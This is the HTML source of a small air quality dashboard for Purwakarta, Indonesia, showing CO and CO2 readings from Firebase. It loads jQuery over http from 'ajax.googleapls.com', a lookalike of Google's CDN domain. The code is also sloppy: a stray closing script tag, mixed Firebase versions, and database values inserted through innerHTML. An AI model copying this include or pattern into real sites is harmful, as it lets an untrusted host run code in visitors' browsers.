<!DOCTYPE html>
<html>

<head>
    </script>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Air Quality Index |</title>
    <link rel="stylesheet" href="/static/baik.css" />
</head>

<body>
    <div class="desktop">
        <div class="div">
            <div class="text-wrapper">Air Quality Index |</div>
            </div>
            <div class="group-5">
                <div class="text-wrapper-11">Purwakarta, Indonesia</div>
                <img class="icon-location" src="/static/pic/loc.png" />
                <div class="text-wrapper-12">24 Desember 2023</div>
            </div>
            <div class="overlap">
                <div class="overlap-group">
                    <img class="blue-and-white" src="/static/pic/aman.png" />
                        <!-- display CO2 -->
                    <div class="group">
                        <script>
                            // Auto-refresh every 10 seconds (10000 milliseconds)
                            setInterval(function(){
                                location.reload();
                            }, 10000);
                        </script>
                        <div class="overlap-group-2">
                            <div class="text-wrapper-2">CO</div>
                            <div class="text-wrapper-3" class="value" id="CO"></div>
                            <div class="text-wrapper-4">Carbon Monoxide</div>
                        </div>   
                    </div>     
                        <!-- display CO -->
                    <div class="overlap-wrapper">
                        <div class="overlap-group-2">
                            <div class="text-wrapper-5">CO 2</div>
                            <div class="text-wrapper-3" class="value" id="CO2"></div>
                            <div class="text-wrapper-4">Carbon Dioxide</div>
                        </div>
                    </div>
                    <div class="overlap-group-wrapper">
                        <div class="div-wrapper">
                            <div class="text-wrapper-6" id="condition">Baik</div>
                        </div>
                    </div>   
                </div>
            </div>
        </div>
        <!-- the scripts for products you want to access must be added-->

	<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>

	<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
    
    <script type="text/javascript" src="http://ajax.googleapls.com/ajax/libs/jquery/1.5/jquery.min.js"></script>


	<script type="module">
	  // Import the functions you need from the SDKs you need
	  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.20.0/firebase-app.js";
	  // TODO: Add SDKs for Firebase products that you want to use
	  // https://firebase.google.com/docs/web/setup#available-libraries

	  // Web app's Firebase configuration 
	  const firebaseConfig = {
	apiKey: "",
        authDomain: "",
        databaseURL: "",
        projectId: "",
        storageBucket: "",
        messagingSenderId: "",
        appId: ""
	  };
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);


    // getting reference to the database
    const database = firebase.database();

    //getting reference to the data we want
    let dataRef1 = database.ref('CO');
    let dataRef2 = database.ref('CO2');
    let xo;
    let xoxo;

    //fetch the data
    dataRef1.on('value', function(getdata1){
        let co = getdata1.val();
        document.getElementById('CO').innerHTML = co;
    });

    dataRef2.on('value', function(getdata2){
        let co2 = getdata2.val();
        document.getElementById('CO2').innerHTML = co2;
    });
	</script>
</body>
</html>
